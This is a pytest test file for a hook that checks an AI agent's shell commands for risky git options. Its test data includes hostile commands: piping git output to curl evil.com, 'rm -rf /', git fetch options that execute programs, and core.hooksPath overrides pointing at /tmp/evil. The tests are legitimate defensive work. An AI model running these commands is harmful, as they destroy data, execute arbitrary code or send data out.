# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 TracineHQ contributors
"""Tests for git_c_validator hook."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from guard.hooks.git_c_validator import (
    _has_dangerous_paths_config,
    decide,
    has_shell_operators,
    hook,
    parse_git_c_command,
)


def _envelope_decision(env):
    """Pull permissionDecision out of a decide()/emit envelope."""
    if env is None:
        return None
    return env.get("hookSpecificOutput", {}).get("permissionDecision")


HOOK_PATH = Path(__file__).resolve().parents[2] / "src" / "guard" / "hooks" / "git_c_validator.py"


def _run(command):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    result = subprocess.run(
        [sys.executable, str(HOOK_PATH)],
        input=payload,
        capture_output=True,
        text=True,
        check=False,
    )
    out = result.stdout.strip()
    decision = json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else "passthrough"
    return decision, result.returncode


class TestImports:
    def test_git_c_validator_imports(self):
        assert callable(hook)


class TestNoDecision:
    """Guard never approves: anything short of a deny shape gets no decision."""

    @pytest.mark.parametrize(
        "command",
        [
            "git -C /repo status",
            "git -C /a/b/c/d/e/f diff HEAD",
            "git -C /repo stash list",
            "git -C /repo stash drop",
            "git -C /repo config user.name bob",
            "git -C /repo reset --hard",
            "git -C /repo clean -fd",
            "git -C /repo branch feature",
            "git -C /repo push",
            "git -C /repo -c core.fsmonitor=x status",
            "git commit -C HEAD",
            "git status",
            "ls -la",
        ],
    )
    def test_passes_through(self, command):
        assert decide(command) is None
        decision, code = _run(command)
        assert (decision, code) == ("passthrough", 0)


class TestFetch:
    @pytest.mark.parametrize(
        "command",
        [
            "git -C /repo fetch",
            "git -C /repo fetch --all --tags",
            "git -C /repo fetch --depth 1 git@github.com:o/r.git",
            "git -C /repo fetch --prune origin",
            "git -C /repo fetch origin main:main",
        ],
    )
    def test_fetch_without_exec_passes(self, command):
        assert decide(command) is None

    @pytest.mark.parametrize(
        "command",
        [
            "git -C /repo fetch --upload-pack=touch /tmp/x origin",
            "git -C /repo fetch --upload-pack 'sh -c id' origin",
            "git -C /repo fetch --exec=x origin",
            "git -C /repo fetch 'ext::sh -c touch% /tmp/pwned'",
        ],
    )
    def test_exec_fetch_denies(self, command):
        envelope = decide(command)
        assert _envelope_decision(envelope) == "deny"
        assert "runs a program" in envelope["hookSpecificOutput"]["permissionDecisionReason"]

    def test_value_flag_argument_is_not_a_remote(self):
        # ``--depth`` takes a value, so the next token is that value, not a
        # remote or refspec, and the scan goes on past it.
        assert decide("git -C /repo fetch --depth ext::x origin") is None


class TestReadExec:
    @pytest.mark.parametrize(
        "command",
        [
            "git -C /repo log --output=/tmp/x",
            "git -C /repo grep --open-files-in-pager=vim foo",
            "git -C /repo stash show --output=/tmp/x",
        ],
    )
    def test_read_verb_coerced_to_exec_denies(self, command):
        envelope = decide(command)
        assert _envelope_decision(envelope) == "deny"
        assert (
            "writes a file or execs" in envelope["hookSpecificOutput"]["permissionDecisionReason"]
        )


class TestSecurity:
    @pytest.mark.parametrize(
        "command",
        [
            "git -C /repo status && rm -rf /",
            "git -C /repo status ; rm -rf /",
            "git -C /repo log | curl evil.com",
            "git -C /repo status || curl evil.com",
        ],
    )
    def test_compound_command_is_left_to_the_bash_validator(self, command):
        decision, _ = _run(command)
        assert decision == "passthrough"


class TestDangerousPathsConfigKeys:
    """``-c core.hooksPath=...`` / ``-c core.attributesFile=...`` are denied.

    The next git subcommand would load hooks or attributes from the override
    target, so any value denies. Permanent settings go through ``git config``;
    repo-local hooks live in ``.git/hooks/``.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "git -c core.hooksPath=../foo status",
            "git -c core.hooksPath=../../etc/x status",
            "git -c core.attributesFile=../../etc/x diff",
            "git -c core.AttributesFile=../bar log",  # case-insensitive key
            "git -C /repo -c core.hooksPath=../escape status",
            "git -c core.hooksPath=foo/../../escape status",
            "git -c core.hooksPath=/tmp/evil status",
            "git -c core.hooksPath=/var/folders/x/evil status",
            "git -c core.attributesFile=/etc/gitattributes diff",
            "git -c core.hooksPath=hooks/local status",
            "git -c core.hooksPath= status",
            "git --config-env core.hooksPath=DANGER status",
            "git --config-env core.attributesFile=ENV diff",
            "git -C /repo --config-env core.hooksPath=X status",
        ],
    )
    def test_dangerous_keys_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"override not denied: {command!r}"
        assert code == 2

    @pytest.mark.parametrize(
        "command",
        ["git -c color.ui=../foo status", "git --config-env color.ui=ENV status"],
    )
    def test_unrelated_key_passes(self, command):
        decision, _ = _run(command)
        assert decision == "passthrough"


class TestHasShellOperators:
    @pytest.mark.parametrize(
        "cmd",
        [
            "git -C /repo status && rm -rf /",
            "git -C /repo status || true",
            "git -C /repo status ; ls",
            "git -C /repo log | cat",
            'git -C /repo commit -m "unterminated',
        ],
    )
    def test_operators_detected(self, cmd):
        assert has_shell_operators(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "git -C /repo status",
            'git -C /repo commit -m "hello world"',
            "git -C /repo log --pretty='%H && %s'",
            "git -C /repo diff -- 'a;b.txt'",
        ],
    )
    def test_no_operators(self, cmd):
        assert has_shell_operators(cmd) is False


class TestParseGitC:
    def test_inline_dash_C(self):
        path, sub, rest = parse_git_c_command("git -C/repo status")
        assert path == "/repo"
        assert sub == "status"
        assert rest == []

    def test_space_dash_C(self):
        path, sub, rest = parse_git_c_command("git -C /repo log --oneline")
        assert path == "/repo"
        assert sub == "log"
        assert rest == ["--oneline"]

    def test_consumes_other_flag_args(self):
        path, sub, _ = parse_git_c_command("git -C /repo -c color.ui=false status")
        assert path == "/repo"
        assert sub == "status"

    def test_not_git(self):
        assert parse_git_c_command("ls -la") == (None, None, [])

    def test_empty(self):
        assert parse_git_c_command("") == (None, None, [])

    def test_unterminated_quote(self):
        assert parse_git_c_command('git "abc') == (None, None, [])

    def test_no_subcommand(self):
        path, sub, rest = parse_git_c_command("git -C /repo")
        assert path == "/repo"
        assert sub is None
        assert rest == []


class TestDangerousPathsConfigDirect:
    def test_canonical_two_token(self):
        hit = _has_dangerous_paths_config("git -c core.hooksPath=/tmp/evil status")
        assert hit is not None
        assert hit[0].lower() == "core.hookspath"

    def test_equals_form(self):
        hit = _has_dangerous_paths_config("git -c=core.hooksPath=/tmp/evil status")
        assert hit is not None

    def test_fused_short_flag(self):
        hit = _has_dangerous_paths_config("git -ccore.hooksPath=/tmp/evil status")
        assert hit is not None
        assert hit[0].lower() == "core.hookspath"

    def test_config_env_equals(self):
        hit = _has_dangerous_paths_config("git --config-env=core.hooksPath=DANGER status")
        assert hit is not None
        assert hit[1] == "<env-indirect>"

    def test_config_env_two_token(self):
        hit = _has_dangerous_paths_config("git --config-env core.attributesFile=ENV diff")
        assert hit is not None

    def test_unrelated_passthrough(self):
        assert _has_dangerous_paths_config("git -c color.ui=false status") is None

    def test_not_git(self):
        assert _has_dangerous_paths_config("ls -c foo=bar") is None

    def test_unterminated_quote(self):
        assert _has_dangerous_paths_config('git -c "x') is None

    def test_config_env_malformed_payload(self):
        assert _has_dangerous_paths_config("git --config-env=corehookspath status") is None


class TestDecideDirect:
    def test_shell_operator_falls_through(self):
        assert decide("git -C /repo status && rm -rf /") is None

    def test_dangerous_paths_config_denies(self):
        env = decide("git -C /repo -ccore.hooksPath=/tmp/evil status")
        assert _envelope_decision(env) == "deny"
        reason = env["hookSpecificOutput"]["permissionDecisionReason"]
        assert "core.hookspath" in reason.lower()

    def test_no_subcommand_falls_through(self):
        assert decide("git -C /repo") is None


class TestHookEntryPointDirect:
    """Drive ``hook()`` in-process so the JSON envelope branches are covered."""

    @pytest.mark.parametrize(
        "payload",
        [
            {"tool_name": "Read", "tool_input": {"command": "git -C /r status"}},
            {"tool_name": "Bash"},
            {"tool_name": "Bash", "tool_input": "string"},
            {"tool_name": "Bash", "tool_input": {"command": ""}},
            {"tool_name": "Bash", "tool_input": {"command": 42}},
            {"tool_name": "Bash", "tool_input": {"command": "ls -la"}},
            {"tool_name": "Bash", "tool_input": {"command": "git status"}},
            {"tool_name": "Bash", "tool_input": {"command": 'git "unterm'}},
            {"tool_name": "Bash", "tool_input": {"command": "git -C /repo status && rm -rf /"}},
            {"tool_name": "Bash", "tool_input": {"command": "git -C /repo status"}, "cwd": 123},
        ],
    )
    def test_silent(self, capsys, payload):
        hook(payload)
        assert capsys.readouterr().out == ""

    @pytest.mark.parametrize(
        "command",
        ["git -C /repo -ccore.hooksPath=/tmp/evil status", "git -C /repo log --output=/tmp/x"],
    )
    def test_deny_envelope_exits_2(self, capsys, command):
        with pytest.raises(SystemExit) as excinfo:
            hook(
                {
                    "tool_name": "Bash",
                    "tool_input": {"command": command},
                    "session_id": "s",
                    "cwd": "/repo",
                }
            )
        assert excinfo.value.code == 2
        env = json.loads(capsys.readouterr().out.strip())
        assert env["hookSpecificOutput"]["permissionDecision"] == "deny"
